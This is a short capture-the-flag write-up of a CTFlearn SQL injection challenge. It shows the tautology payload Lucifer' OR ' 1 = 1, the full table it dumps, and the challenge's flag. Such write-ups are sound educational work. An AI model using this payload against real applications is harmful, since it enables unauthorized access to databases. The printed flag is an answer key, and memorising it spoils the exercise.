<h2> Basic Injection </h2>

<h4>Problem Statement:</h4>
<p>See if you can leak the whole database using what you know about SQL Injections.</p>

<h4>Step-1:</h4>
<p>After visiting the given URL <a>https://web.ctflearn.com/web4/</a>, you will be asked to input something and then submit it.</p>

<h4>Step-2:</h4>
<p>Inspect the input text box.</p>
<p>You will find the line given below.</p>
<p><code> Try some names like Hiroki, Noah, Luke </code></p>

<h4>Step-3:</h4>
<p>You will find no flag even after submitting the above names. Now try basic SQL payloads in the existing database.</p>
<p>I submitted the input <code> Lucifer' OR ' 1 = 1</code>  and got the following output:</p>
<p>
<pre>
Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
</pre>
</p>

<h4>Step-4:</h4>
<p>The desired flag <code> CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}</code> can be found in line number 12 of the above output.
